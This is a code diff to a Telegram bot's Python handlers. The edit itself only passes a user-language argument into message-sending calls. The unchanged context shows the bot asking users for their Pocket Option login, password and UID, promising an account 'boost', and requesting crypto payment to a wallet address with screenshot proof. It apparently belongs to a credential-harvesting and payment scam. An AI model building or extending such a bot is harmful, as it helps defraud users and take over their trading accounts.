@@ -223,7 +223,8 @@ async def stats_irl_handler(callback: types.CallbackQuery, state: FSMContext):
         message=callback,
         photo_name="Top account.jpg",
         text=combined_text,
-        reply_markup=get_statistics_keyboard(_get_user_lang(callback.from_user.id))
+        reply_markup=get_statistics_keyboard(_get_user_lang(callback.from_user.id)),
+        lang=_get_user_lang(callback.from_user.id)
     )
     await state.set_state(UserFlow.main_menu) # Or back to start
 
@@ -426,7 +427,8 @@ async def pocket_option_verify_handler(callback: types.CallbackQuery, state: FSM
         message=callback,
         photo_name="give my your UID.jpg",
         text=_msg("pocket_option_ask_for_uid", callback.from_user.id),
-        reply_markup=get_back_to_platform_select_keyboard(_get_user_lang(callback.from_user.id))
+        reply_markup=get_back_to_platform_select_keyboard(_get_user_lang(callback.from_user.id)),
+        lang=_get_user_lang(callback.from_user.id)
     )
     await state.set_state(UserFlow.pocket_option_uid_input)
 
@@ -707,7 +709,8 @@ async def pocket_option_login_input_handler(message: types.Message, state: FSMCo
             message=message,
             photo_name="give my your UID.jpg",
             text=_msg("pocket_option_ask_for_uid", message.from_user.id),
-            reply_markup=get_back_to_platform_select_keyboard(_get_user_lang(message.from_user.id))
+            reply_markup=get_back_to_platform_select_keyboard(_get_user_lang(message.from_user.id)),
+            lang=_get_user_lang(message.from_user.id)
         )
         await state.set_state(UserFlow.pocket_option_uid_input)
         return
@@ -813,11 +816,13 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
     uid_ok = bool(creds.get('uid'))
     if not (email_ok and password_ok and uid_ok):
         await callback.answer("Будь ласка, надішліть ваш логін і пароль, щоб продовжити.", show_alert=True)
+        lang_sel = _get_user_lang(callback.from_user.id)
         await send_message_with_photo(
             message=callback,
             photo_name="gread need yuor lign password.jpg",
-            text=_msg("pocket_option_verification_successful", callback.from_user.id),
-            reply_markup=None
+            text=_msg("pocket_option_verification_successful", callback.from_user.id, override_lang=lang_sel),
+            reply_markup=None,
+            lang=lang_sel
         )
         await state.set_state(UserFlow.pocket_option_ready_to_boost)
         return
@@ -838,7 +843,8 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
                     wallet_address=_admin_panel.get_wallet_address()
                 ),
                 reply_markup=get_paid_boost_keyboard(MANAGER_URL, _get_user_lang(callback.from_user.id)),
-                parse_mode="HTML"
+                parse_mode="HTML",
+                lang=_get_user_lang(callback.from_user.id)
             )
             await state.set_state(UserFlow.waiting_for_payment_screenshot)
             await callback.answer()
@@ -854,7 +860,8 @@ async def start_boost_handler(callback: types.CallbackQuery, state: FSMContext):
         message=callback,
         photo_name="Bost mode on.jpg",
         text=_msg("pocket_option_boosting_started", callback.from_user.id),
-        reply_markup=get_boost_active_keyboard(_get_user_lang(callback.from_user.id))
+        reply_markup=get_boost_active_keyboard(_get_user_lang(callback.from_user.id)),
+        lang=_get_user_lang(callback.from_user.id)
     )
 
     await asyncio.sleep(2)
@@ -907,7 +914,8 @@ async def start_paid_boost_handler(callback: types.CallbackQuery, state: FSMCont
             message=callback,
             photo_name="Bost mode on.jpg",
             text=_msg("pocket_option_boosting_started", callback.from_user.id),
-            reply_markup=get_boost_active_keyboard(_get_user_lang(callback.from_user.id))
+            reply_markup=get_boost_active_keyboard(_get_user_lang(callback.from_user.id)),
+            lang=_get_user_lang(callback.from_user.id)
         )
         await state.set_state(UserFlow.pocket_option_boosting)
         await callback.answer()
@@ -928,7 +936,8 @@ async def start_paid_boost_handler(callback: types.CallbackQuery, state: FSMCont
             wallet_address=admin_panel.get_wallet_address()
         ),
         reply_markup=get_paid_boost_keyboard(MANAGER_URL, _get_user_lang(callback.from_user.id)),
-        parse_mode="HTML"
+        parse_mode="HTML",
+        lang=_get_user_lang(callback.from_user.id)
     )
     await state.set_state(UserFlow.waiting_for_payment_screenshot)
 
@@ -940,7 +949,8 @@ async def paid_boost_confirmed_handler(callback: types.CallbackQuery, state: FSM
         message=callback,
         photo_name="give my your UID.jpg", # Placeholder, maybe change to a more relevant image
         text=_msg("request_payment_screenshot", callback.from_user.id),
-        reply_markup=get_back_to_platform_select_keyboard(_get_user_lang(callback.from_user.id))
+        reply_markup=get_back_to_platform_select_keyboard(_get_user_lang(callback.from_user.id)),
+        lang=_get_user_lang(callback.from_user.id)
     )
     await state.set_state(UserFlow.waiting_for_payment_screenshot)
 
@@ -962,7 +972,8 @@ async def payment_screenshot_handler(message: types.Message, state: FSMContext):
         message=message,
         photo_name="succes connected.jpg", # Generic success
         text=_msg("payment_screenshot_received", message.from_user.id),
-        reply_markup=None
+        reply_markup=None,
+        lang=_get_user_lang(message.from_user.id)
     )
 
     # Update user's boost status
@@ -1082,7 +1093,8 @@ async def current_balance_handler(callback: types.CallbackQuery, state: FSMConte
             message=callback,
             photo_name="your currency balance.jpg",
             text=caption,
-            reply_markup=get_boost_active_keyboard(_get_user_lang(callback.from_user.id))
+            reply_markup=get_boost_active_keyboard(_get_user_lang(callback.from_user.id)),
+            lang=_get_user_lang(callback.from_user.id)
         )
         await callback.answer()
     except Exception as e:
@@ -1115,7 +1127,8 @@ async def view_statistics(callback: CallbackQuery, state: FSMContext):
         message=callback,
         photo_name="Top account.jpg",
         text=combined_text,
-        reply_markup=get_statistics_keyboard(_get_user_lang(callback.from_user.id))
+        reply_markup=get_statistics_keyboard(_get_user_lang(callback.from_user.id)),
+        lang=_get_user_lang(callback.from_user.id)
     )
     await state.set_state(UserFlow.main_menu) # Or back to start
 
@@ -1140,6 +1153,7 @@ async def update_statistics(callback: CallbackQuery, state: FSMContext):
         message=callback,
         photo_name="Top account.jpg",
         text=combined_text,
-        reply_markup=get_statistics_keyboard(_get_user_lang(callback.from_user.id))
+        reply_markup=get_statistics_keyboard(_get_user_lang(callback.from_user.id)),
+        lang=_get_user_lang(callback.from_user.id)
     )
     await callback.answer()
